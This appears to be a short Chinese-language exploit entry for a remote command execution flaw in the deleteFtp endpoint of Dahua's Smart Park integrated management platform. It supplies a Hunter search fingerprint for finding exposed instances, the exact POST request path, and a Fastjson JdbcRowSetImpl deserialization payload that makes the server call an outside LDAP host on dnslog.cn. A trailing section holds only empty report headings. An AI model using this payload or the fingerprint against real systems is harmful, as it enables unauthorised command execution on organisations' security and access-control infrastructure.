# 大华智慧园区综合管理平台deleteFtp接口远程命令执行

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1`

**请求体 / payload**
```
deleteFtp接口存在命令执行漏洞，可执行LDAP解析等。
Host: xx.xx.xx.xx
Content-Length: 243
Content-Type: application/json
{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://tcpj5b.dnslog.cn","autoCommit":true}}}

```

**其他**
- 大华智慧园区综合管理平台deleteFtp 接口远程命令执行: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台